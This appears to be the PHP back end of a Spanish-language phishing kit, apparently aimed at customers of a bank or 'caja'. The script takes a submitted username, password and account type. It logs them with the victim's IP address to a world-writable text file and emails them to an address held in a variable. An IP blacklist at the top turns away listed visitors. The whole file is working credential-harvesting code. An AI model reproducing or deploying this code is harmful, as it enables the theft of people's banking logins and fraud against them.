<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------
 
require('../config.php');
date_default_timezone_set('America/Bogota');
$usuario = $_POST['usr'];
$pass = $_POST['pas'];
$tipo = $_POST['tip'];

$ipcliente= $_SERVER['REMOTE_ADDR'];


$datos = 'Usuario: ['.$tipo.'] '.$usuario.' | Clave: '.$pass.' | IP: '.$ipcliente;


$file = '../listado.txt';
$salto = "";
$cabecera = "---------------- Paso 1 (".date("Y-m-d H:i:s").")";

$fp = fopen($file, 'a+');
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $cabecera.PHP_EOL);
fwrite($fp, utf8_decode($datos).PHP_EOL);
fclose($fp);
chmod($file, 0777);
echo $file;

$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s");  

$to = $destino;
$subject = "Datos Caja Paso 1 ".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Usuario: </b>".$usuario." <b>Contraseña: </b>".$pass." <b>Dirección IP: </b>".$ipcliente." <b>Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();
?>